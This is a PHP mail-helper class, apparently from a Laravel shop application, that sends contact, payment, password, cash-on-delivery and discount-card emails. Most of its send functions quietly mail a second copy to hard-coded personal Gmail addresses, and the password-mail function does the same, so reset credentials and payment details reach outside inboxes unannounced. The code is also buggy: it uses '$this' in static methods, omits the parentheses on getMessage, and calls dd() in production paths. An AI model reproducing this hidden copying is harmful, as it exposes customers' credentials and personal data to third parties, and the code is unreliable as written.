<?php
namespace App\Globals;

use App\Models\Tbl_item;
use App\Models\Tbl_item_code;
use App\Models\Tbl_item_code_invoice;
use App\Models\Tbl_mlm_slot;
use App\Models\Tbl_mlm_discount_card_log;
use App\Models\Tbl_customer;

use App\Globals\Mlm_voucher;
use App\Globals\Item;
use App\Globals\Item_code;
use App\Globals\Mlm_compute;

use Session;
use Carbon\Carbon;
use Validator;
use Mail;
use App\Globals\Settings;
use Config;
use File;
class Mail_global
{
	public static function mail($data, $shop_id, $from = null, $theme = null)
    {
        if ($from == "contact") 
        {
            Mail_global::contact_mail($data, $shop_id);
        }
        elseif($from == "payment")
        {
            Mail_global::payment_mail($data, $shop_id);
        }
        elseif($from == "password")
        { 
            Mail_global::password_mail($data, $shop_id);
        }
        elseif($from == "cod")
        {
            Mail_global::cod_mail($data, $shop_id);
        }
        elseif($from == "discount_card")
        {
            Mail_global::mail_discount_card($data, $shop_id);
        }
        else
        {
            Settings::set_mail_setting($shop_id);
            $data['mail_username'] = Config::get('mail.username');

            if(isset($data['template']->header_image))
            {
                if (!File::exists(public_path() . $data['template']->header_image))
                {
                    $data['template']->header_image = null;
                }
            }   
           
            // $data['Mail_a_driver'] = Config::get('mail.driver');
            // $data['Mail_a_host'] = Config::get('mail.host');
            // $data['Mail_a_port'] = Config::get('mail.port');
            // $data['Mail_a_username'] = Config::get('mail.username');
            // $data['Mail_a_password'] = Config::get('mail.password');
            // $data['Mail_a_encryption'] = Config::get('mail.encryption');

            try 
            {
                Mail::send('emails.full_body', $data, function ($m) use ($data) {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                    $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
                });

                Mail::send('emails.full_body', $data, function ($m) use ($data) {
                    $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);

                    $m->to('lukeglennjordan2@gmail.com', $data['mail_username'])->subject($data['mail_subject']);
                });
            }
            catch (\Exception $e) 
            {
                return json_encode($e);
            }
        }
    }
    public static function contact_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.contact', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.contact', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            $result = 0;
            $this->fail_email($e->getMessage);
        }

        return $result;
    }
    public static function payment_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.payment', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.payment', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            $result = 0;
            $this->fail_email($e->getMessage);
        }

        return $result;
    }
    public static function password_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.password', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.password', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            $this->fail_email($e->getMessage);
            $result = 0; 
        }

        return $result;
    }
    public static function cod_mail($data, $shop_id)
    {
        Settings::set_mail_setting($shop_id);
        $data['mail_username'] = Config::get('mail.username');
        try 
        {
            Mail::send('emails.cod', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to($data['mail_to'], $data['mail_username'])->subject($data['mail_subject']);
            });
            Mail::send('emails.cod', $data, function ($m) use ($data) 
            {
                $m->from($data['mail_username'], $_SERVER['SERVER_NAME']);
                $m->to("edwardguevarra2003@gmail.com", $data['mail_username'])->subject($data['mail_subject']);
            });
            $result = 1;
        } 
        catch (\Exception $e) 
        {
            $this->fail_email($e->getMessage);
            $result = 0; 
        }

        return $result;
    }
    public static function mail_discount_card($discount_card_log_id)
    {
    	$data = [];
    	$data['discount_card'] = Tbl_mlm_discount_card_log::where('discount_card_log_id', $discount_card_log_id)->first();
    	$data['customer'] = Tbl_customer::where('customer_id', $data['discount_card']->discount_card_customer_holder)->first();
    	$data['customer_sponsor'] = Tbl_customer::where('customer_id', $data['discount_card']->discount_card_customer_sponsor)->first();
       Mail::send('emails.discount_card', $data, function ($m) use ($data) {
            $m->from(env('MAIL_USERNAME'), $_SERVER['SERVER_NAME']);

            $m->to($data['customer']->email, env('MAIL_USERNAME'))->subject('Discount Card');
        });
    }
    public static function fail_email($x)
    {
        dd($x);
    }
    public static function create_email_content($data,$shop_id,$content_key = null)
    {
        $return["subject"] = EmailContent::getSubject($content_key);
        $return["shop_key"] = EmailContent::getShopkey_front($shop_id);

        $txt[0]["txt_to_be_replace"] = "[link]";
        $txt[0]["txt_to_replace"] = $_SERVER["SERVER_NAME"];

        $txt[1]["txt_to_be_replace"] = "[password]";
        $txt[1]["txt_to_replace"] = $data["order_id"];

        $change_content = $txt;

        $return["content"] = EmailContent::email_txt_replace($content_key, $change_content);

        dd($return);
    }
}